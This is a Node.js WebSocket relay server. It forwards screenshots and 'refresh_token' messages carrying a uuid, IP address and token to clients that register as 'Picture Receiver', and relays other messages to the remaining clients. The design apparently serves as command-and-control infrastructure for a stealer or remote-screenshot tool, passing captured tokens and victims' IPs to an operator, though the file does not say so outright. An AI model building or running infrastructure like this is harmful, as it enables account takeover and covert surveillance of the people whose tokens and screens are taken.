const http = require("http");
const express = require("express");
const WebSocket = require("ws");
const crypto = require("crypto");

const app = express();
app.use(express.static("public"));
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });

const clients = new Map();
const pictureReceivers = new Set();

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

server.listen(PORT, () => console.log(`Server is running on port ${PORT}`));

wss.on("connection", (ws) => {
    const clientId = crypto.randomBytes(16).toString("hex");
    clients.set(ws, { id: clientId, isPictureReceiver: false });

    ws.on("message", (data) => handleMessage(ws, data));
    ws.on("close", () => handleDisconnect(ws));

    if (wss.clients.size === 1) {
        startKeepAlive();
    }
});

function handleMessage(ws, data) {
    if (data instanceof Buffer) {
        handleBinaryMessage(ws, data);
    } else {
        handleJSONMessage(ws, data);
    }
}

function handleBinaryMessage(ws, data) {
    const view = new DataView(data.buffer, data.byteOffset, data.byteLength);
    const jsonLength = view.getUint32(0, true);
    const jsonString = new TextDecoder().decode(new Uint8Array(data.buffer, data.byteOffset + 4, jsonLength));
    const messageData = JSON.parse(jsonString);

    if (messageData.type === 'refresh_token') {
        const binaryMessage = createBinaryMessage({
            type: 'refreshToken',
            uuid: messageData.uuid,
            ip: messageData.ip,
            token: messageData.token
        });
        broadcastToPictureReceivers(binaryMessage);
    }
}

function handleJSONMessage(ws, data) {
    try {
        const messageData = JSON.parse(data);
        if (messageData.command === 'Picture Receiver') {
            clients.get(ws).isPictureReceiver = true;
            pictureReceivers.add(ws);
        } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
            broadcastToPictureReceivers(messageData);
        } else if (messageData.action === 'screenshot_result') {
            broadcastToPictureReceivers(messageData);
        } else {
            broadcastToAllExceptPictureReceivers(ws, messageData);
        }
    } catch (e) {
        console.error('Error parsing JSON data:', e);
    }
}

function createBinaryMessage(jsonData, binaryData = null) {
    const jsonString = JSON.stringify(jsonData);
    const jsonBuffer = Buffer.from(jsonString, 'utf8');
    
    const totalLength = 4 + jsonBuffer.length + (binaryData ? binaryData.length : 0);
    const result = Buffer.alloc(totalLength);
    
    result.writeUInt32LE(jsonBuffer.length, 0);
    jsonBuffer.copy(result, 4);
    
    if (binaryData) {
        binaryData.copy(result, 4 + jsonBuffer.length);
    }
    
    return result;
}

function broadcastToPictureReceivers(message) {
    const data = Buffer.isBuffer(message) ? message : Buffer.from(JSON.stringify(message));
    pictureReceivers.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(data, error => {
                if (error) console.error("Error sending message to receiver:", error);
            });
        }
    });
}

function broadcastToAllExceptPictureReceivers(senderWs, message) {
    const data = Buffer.from(JSON.stringify(message));
    wss.clients.forEach(client => {
        if (client !== senderWs && client.readyState === WebSocket.OPEN && !pictureReceivers.has(client)) {
            client.send(data);
        }
    });
}

function handleDisconnect(ws) {
    const client = clients.get(ws);
    if (client) {
        if (client.isPictureReceiver) {
            pictureReceivers.delete(ws);
        }
        clients.delete(ws);
    }

    if (wss.clients.size === 0) {
        stopKeepAlive();
    }
}

let keepAliveInterval;

function startKeepAlive() {
    if (!keepAliveInterval) {
        keepAliveInterval = setInterval(() => {
            wss.clients.forEach(client => {
                if (client.readyState === WebSocket.OPEN) {
                    client.ping();
                }
            });
        }, 30000);
    }
}

function stopKeepAlive() {
    if (keepAliveInterval) {
        clearInterval(keepAliveInterval);
        keepAliveInterval = null;
    }
}

process.on('SIGINT', () => {
    wss.close(() => {
        console.log('WebSocket server closed');
        process.exit(0);
    });
});
